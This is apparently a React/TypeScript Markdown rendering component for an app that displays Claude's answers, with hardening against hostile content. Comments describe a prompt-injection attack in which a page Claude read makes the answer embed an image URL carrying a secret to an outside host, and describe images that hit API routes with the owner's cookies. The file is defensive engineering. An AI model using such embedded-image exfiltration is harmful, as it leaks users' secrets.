import * as React from 'react'
import { Link } from 'react-router'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import type { createLowlight } from 'lowlight'
import { cn } from '@/lib/utils'
import { CodeBlock } from './code-block'
import { Diagram } from './diagram'
import { canHighlight } from './highlightLimit'
import { useT, withGroups } from '@/i18n'
import { FILE_HREF, fileHrefPath } from '@/features/files/viewerStore'

// ```git blocks: the live graph of a repository (features/git), loaded the first time one shows up.
const GitBlock = React.lazy(withGroups(['git'], () => import('@/features/git/GitBlock')))
const InfraBlock = React.lazy(withGroups(['infra'], () => import('@/features/infra/InfraBlock')))
// ```pr-review blocks: a review Claude wrote for a pull request, published on GitHub by the user's click
const PrReviewBlock = React.lazy(withGroups(['code'], () => import('@/features/code/PrReviewBlock')))

// Syntax highlighting (grammars in ./highlight, a separate chunk): code blocks render plain until the first one with
// a language loads it, then every mounted Markdown re-renders highlighted. Unknown languages render as plain code.
let lowlight: ReturnType<typeof createLowlight> | null = null
let lowlightLoad: Promise<void> | null = null
const lowlightListeners = new Set<() => void>()
function loadLowlight() {
  lowlightLoad ??= import('./highlight')
    .then((m) => {
      lowlight = m.lowlight
      lowlightListeners.forEach((cb) => cb())
    })
    .catch(() => {
      lowlightLoad = null // retried by the next code block
    })
}
const subscribeLowlight = (cb: () => void) => {
  lowlightListeners.add(cb)
  return () => lowlightListeners.delete(cb)
}
const lowlightReady = () => lowlight !== null
const noHighlight = () => false
/** A fenced code block with a language somewhere in the text (generous: a false positive only costs a re-render). Exactly 3 marks: a longer run still matches on its last 3, and the test stays linear. */
const FENCE_LANG = /(?:`{3}|~{3})[ \t]*[^\s`~]/

type HNode = { type: string; tagName?: string; properties?: Record<string, unknown>; children?: HNode[]; value?: string }
const hText = (n: HNode): string => (n.type === 'text' ? (n.value ?? '') : (n.children ?? []).map(hText).join(''))

/** `pre > code.language-x` → highlighted children (same output shape as rehype-highlight with detect: false). */
function rehypeHighlightLite() {
  const walk = (node: HNode) => {
    for (const child of node.children ?? []) {
      if (child.type === 'element' && child.tagName === 'pre') {
        const code = child.children?.find((c) => c.type === 'element' && c.tagName === 'code')
        const cls = code?.properties?.className
        const lang = Array.isArray(cls) ? /^(?:language|lang)-(.+)$/.exec(cls.find((c) => /^(?:language|lang)-/.test(String(c))) as string)?.[1] : undefined
        const ll = lowlight
        if (code && lang && !ll) loadLowlight()
        else if (code && lang && ll?.registered(lang)) {
          const text = hText(code)
          if (!canHighlight(lang, text.length)) continue
          code.children = ll.highlight(lang, text).children as unknown as HNode[]
          code.properties = { ...code.properties, className: [...(cls as string[]), 'hljs'] }
        }
      } else walk(child)
    }
  }
  return (tree: HNode) => walk(tree)
}
const REHYPE_PLUGINS = [rehypeHighlightLite]
const REMARK_PLUGINS = [remarkGfm]

function textOf(node: React.ReactNode): string {
  if (node == null || typeof node === 'boolean') return ''
  if (typeof node === 'string' || typeof node === 'number') return String(node)
  if (Array.isArray(node)) return node.map(textOf).join('')
  if (React.isValidElement(node)) return textOf((node.props as { children?: React.ReactNode }).children)
  return ''
}

const SAFE_URL = /^(https?:|mailto:|\/|#|\.{0,2}\/)/i
/** Off this site: any `http(s):` URL - `http:host/…` without slashes too, absolute for the browser when its scheme
 * differs from the page's - and protocol-relative `//host/…` - browsers also read `/\host` (a backslash, tabs or
 * line breaks between the two) as `//host`. */
const EXTERNAL = /^(https?:|[\t\n\r]*[\\/][\t\n\r]*[\\/])/i

/** A picture of this site loads at once unless its address is an API route other than a file's: `![](/api/…)`
 *  written by someone else would call that route with the owner's cookies the moment the message shows. */
export function loadsAtOnce(src: string): boolean {
  try {
    const path = decodeURIComponent(new URL(src, location.href).pathname)
    return !/^\/+api(\/|$)/i.test(path) || (path.startsWith('/api/files/') && !path.includes('..'))
  } catch {
    return false
  }
}

/** A remote picture loads only on a click: an answer that embeds `![](https://host/?d=<secret>)` (a prompt injection
 * in a page Claude read) would otherwise send it the moment the message shows. Pictures of this site load at once. */
function RemoteImage({ src, alt }: { src: string; alt: string }) {
  const t = useT()
  const [shown, setShown] = React.useState(false)
  if (shown) return <img src={src} alt={alt} loading="lazy" referrerPolicy="no-referrer" />
  let host = src
  try {
    host = new URL(src, location.href).host
  } catch {
    // shown as written
  }
  return (
    <button type="button" onClick={() => setShown(true)} title={src} className="inline-flex max-w-full items-center gap-1 rounded border border-dashed px-2 py-0.5 text-[0.9em] text-muted-foreground hover:text-foreground">
      <span className="truncate">{alt ? `${alt} · ` : ''}{t('md.loadImage', { host })}</span>
    </button>
  )
}

type MarkdownProps = {
  children: string
  className?: string
  /** Rewrite internal links (e.g. docs slugs). Return null to keep the default behaviour. */
  onLink?: (href: string) => (() => void) | null
  /** Extra component overrides. */
  components?: Components
  /** A picture of this site -> the URL to load at once, or null: it waits for a click like a remote one (default: all
   *  load as written). A text from outside (an agent's answer) could embed `![](/api/...)`, a GET with the owner's cookies. */
  localImage?: (src: string) => string | null
}

/** For a text written elsewhere (another server, GitHub): code blocks stay code - no ```pr-review, ```git, ```infra or
 *  ```mermaid block turns into a live card that acts or reads with the owner's rights. */
export const PLAIN_BLOCKS: Components = {
  pre({ children }) {
    const child = React.Children.only(children) as React.ReactElement<{ children?: React.ReactNode }>
    return <CodeBlock code={textOf(child?.props?.children).replace(/\n$/, '')} className="my-2" />
  },
}

/**
 * GitHub-flavoured markdown. Raw HTML is NOT rendered (escaped), unsafe URLs are dropped, app routes (/…) use
 * the router, external links
 * open in a new tab with rel="noopener noreferrer nofollow", code blocks are highlighted with a copy button,
 * ```mermaid blocks are drawn as diagrams, ```git blocks as the live graph of a repository.
 */
// Memoized: a parent that re-renders for something else (a dictionary group arriving re-renders every `useT` user)
// reuses the parsed tree instead of parsing and highlighting the whole text again.
export const Markdown = React.memo(function Markdown({ children, className, onLink, components, localImage }: MarkdownProps) {
  // Re-render once the grammars are there - only the messages that have something to highlight (the others would
  // parse their whole text again for the same output).
  React.useSyncExternalStore(subscribeLowlight, FENCE_LANG.test(children) ? lowlightReady : noHighlight)
  const comps = React.useMemo<Components>(
    () => ({
      a({ href = '', children: c, node: _n, ...rest }) {
        if (!SAFE_URL.test(href)) return <span>{c}</span>
        const handler = onLink?.(href)
        // a link to a file of the conversation: its title is the real path (the text may say anything); refused by
        // onLink (outside what the answer may open: an agent's scope) it is plain text, out of the file menus too
        const file = href.startsWith(FILE_HREF) ? (fileHrefPath(href) ?? '') : undefined
        if (file !== undefined && !handler) return <span title={file}>{c}</span>
        if (handler)
          return (
            <a
              href={href}
              title={file}
              onClick={(e) => {
                if (e.metaKey || e.ctrlKey || e.shiftKey || e.button !== 0) return
                e.preventDefault()
                handler()
              }}
              {...rest}
            >
              {c}
            </a>
          )
        // Internal app routes stay in the SPA (no full reload).
        const external = EXTERNAL.test(href)
        if (href.startsWith('/') && !external && !href.startsWith('/api/'))
          return (
            <Link to={href} {...(rest as object)}>
              {c}
            </Link>
          )
        return (
          <a href={href} {...(external ? { target: '_blank', rel: 'noopener noreferrer nofollow' } : {})} {...rest}>
            {c}
          </a>
        )
      },
      pre({ children: c }) {
        const child = React.Children.only(c) as React.ReactElement<{ className?: string; children?: React.ReactNode }>
        const lang = /language-([\w-]+)/.exec(child?.props?.className || '')?.[1]
        if (lang === 'mermaid') return <Diagram code={textOf(child?.props?.children).replace(/\n$/, '')} className="my-3" />
        if (lang === 'git') {
          const code = textOf(child?.props?.children).replace(/\n$/, '')
          return (
            <React.Suspense fallback={<CodeBlock code={code} className="my-3" />}>
              <GitBlock code={code} className="my-3" />
            </React.Suspense>
          )
        }
        if (lang === 'pr-review') {
          const code = textOf(child?.props?.children).replace(/\n$/, '')
          return (
            <React.Suspense fallback={<CodeBlock code={code} className="my-3" />}>
              <PrReviewBlock code={code} className="my-3" />
            </React.Suspense>
          )
        }
        if (lang === 'infra') {
          const code = textOf(child?.props?.children).replace(/\n$/, '')
          return (
            <React.Suspense fallback={<CodeBlock code={code} className="my-3" />}>
              <InfraBlock code={code} className="my-3" />
            </React.Suspense>
          )
        }
        return (
          <CodeBlock code={textOf(child?.props?.children).replace(/\n$/, '')} language={lang} className="my-3">
            <code className={child?.props?.className}>{child?.props?.children}</code>
          </CodeBlock>
        )
      },
      img({ src, alt }) {
        const s = typeof src === 'string' ? src : ''
        if (!SAFE_URL.test(s) || /^mailto:/i.test(s)) return null
        if (EXTERNAL.test(s)) return <RemoteImage src={s} alt={alt || ''} />
        const local = localImage ? localImage(s) : s
        return local === null || !loadsAtOnce(local) ? <RemoteImage src={s} alt={alt || ''} /> : <img src={local} alt={alt || ''} loading="lazy" />
      },
      // A cell that holds a sentence keeps a readable width: on a narrow screen the table scrolls sideways (globals.css)
      // instead of squeezing the sentence to one word a line.
      td({ node, children: c, style }) {
        return (
          <td style={style} data-long={node && hText(node as unknown as HNode).length > 40 ? '' : undefined}>
            {c}
          </td>
        )
      },
      ...components,
    }),
    [onLink, components, localImage],
  )
  const deep = React.useMemo(() => tooDeep(children), [children])
  // Parsing is one blocking pass: a huge text (a 2 MB .md, a giant table) would freeze the page for seconds; a very
  // deep nesting (2 000 "> ") overflows the stack of the renderer, which is recursive; thousands of "[" are slow.
  if (children.length > MAX_MARKDOWN || deep)
    return <pre className={cn('prose-mx font-sans text-sm whitespace-pre-wrap [overflow-wrap:anywhere]', className)}>{children}</pre>
  return (
    <div className={cn('prose-mx', className)}>
      <ReactMarkdown remarkPlugins={REMARK_PLUGINS} rehypePlugins={REHYPE_PLUGINS} components={comps} skipHtml>
        {children}
      </ReactMarkdown>
    </div>
  )
})

/** Above this size (characters) a text is shown as plain text instead of formatted. */
const MAX_MARKDOWN = 300_000
/** Above this nesting (quotes, lists) too: far beyond any real text, far below what overflows the stack. */
const MAX_DEPTH = 100

/** Above this number of "[" too: link openers and definitions cost the parser more than linear time ("[a](" 20 000
 *  times: seconds of frozen page), and a real text never has that many. */
const MAX_BRACKETS = 3000

/** A line opening more than MAX_DEPTH quotes / lists (its markers, or its indentation for nested lists), or more
 *  than MAX_BRACKETS "[" in all. */
function tooDeep(text: string): boolean {
  if (text.length < MAX_DEPTH) return false
  let brackets = 0
  for (let i = text.indexOf('['); i >= 0; i = text.indexOf('[', i + 1)) if (++brackets > MAX_BRACKETS) return true
  for (const line of text.split('\n')) {
    const lead = /^[\s>*+\-\d.)]*/.exec(line)![0]
    if (lead.length <= MAX_DEPTH) continue
    const marks = lead.match(/>|[-*+](?=\s)|\d{1,9}[.)](?=\s)/g)?.length ?? 0
    const indent = /^\s*/.exec(lead)![0].length / 2
    if (marks + indent > MAX_DEPTH) return true
  }
  return false
}
